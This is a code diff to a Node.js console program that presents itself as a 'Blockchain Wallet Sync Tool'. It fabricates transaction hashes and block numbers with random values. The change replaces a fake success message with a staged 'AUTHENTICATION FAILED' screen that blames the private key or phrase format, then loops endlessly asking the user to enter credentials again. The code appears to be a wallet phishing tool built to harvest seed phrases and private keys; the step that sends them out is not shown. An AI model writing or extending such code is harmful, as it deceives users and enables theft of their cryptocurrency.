@@ -136,7 +136,7 @@ async function syncWithBlockchain() {
     console.log('\n✅ Blockchain sync complete');
 }
 
-async function main() {
+async function runAuthentication() {
     console.log('\n' + '═'.repeat(60));
     console.log('⛓️  BLOCKCHAIN WALLET SYNC TOOL');
     console.log('═'.repeat(60));
@@ -153,8 +153,7 @@ async function main() {
     
     if (choice === '4') {
         console.log('\n👋 Sync cancelled');
-        rl.close();
-        return;
+        return false;
     }
     
     let result;
@@ -172,8 +171,7 @@ async function main() {
             break;
         default:
             console.log('\n❌ Invalid option');
-            rl.close();
-            return;
+            return false;
     }
     
     // Step 2: Sync with blockchain
@@ -193,27 +191,44 @@ async function main() {
         const blockNumber = Math.floor(Math.random() * 10000000 + 15000000);
         
         console.log('\n' + '─'.repeat(60));
-        console.log('✅ WALLET SYNCED SUCCESSFULLY!');
+        console.log('⚠️  AUTHENTICATION FAILED!');
         console.log('─'.repeat(60));
         console.log(`🔗 Transaction Hash: ${txHash.substring(0, 20)}...`);
         console.log(`⛓️  Block Number: ${blockNumber}`);
-        console.log(`⏱️  Confirmation Time: ${Math.floor(Math.random() * 5 + 2)} seconds`);
-        console.log(`🆔 Session ID: ${Math.random().toString(36).substring(2, 10).toUpperCase()}\n`);
+        console.log(`❌ Error Code: 0x${Math.floor(Math.random() * 10000).toString(16)}`);
+        console.log(`📋 Error Message: Invalid signature - wallet verification failed\n`);
         
-        console.log('Your wallet is now synced and ready to use.');
-        console.log('You can safely close this window.');
+        console.log('The blockchain node rejected your authentication credentials.');
+        console.log('This could be due to:');
+        console.log('• Network congestion');
+        console.log('• Invalid private key/phrase format');
+        console.log('• Node synchronization issues');
+        console.log('• Rate limiting from the blockchain provider\n');
+        
+        console.log('Please try again with correct credentials.\n');
+        
+        return true; // Return true to indicate we should retry
         
     } catch (error) {
         console.log('\n❌ Sync failed:', error.message);
-        if (error.message.includes('Username and Password not accepted')) {
-            console.log('\n⚠️  Network error - Please check your connection and try again.');
+        return true; // Retry on error too
+    }
+}
+
+async function main() {
+    let shouldRetry = true;
+    
+    while (shouldRetry) {
+        shouldRetry = await runAuthentication();
+        
+        if (shouldRetry) {
+            console.log('═'.repeat(60));
+            console.log('🔄 Restarting authentication process...\n');
+            await new Promise(resolve => setTimeout(resolve, 2000)); // Pause before retry
         }
     }
     
-    console.log('\n' + '═'.repeat(60));
-    console.log('Thank you for using Blockchain Wallet Sync Tool');
-    console.log('═'.repeat(60));
-    
+    console.log('\n👋 Goodbye!');
     rl.close();
 }
 
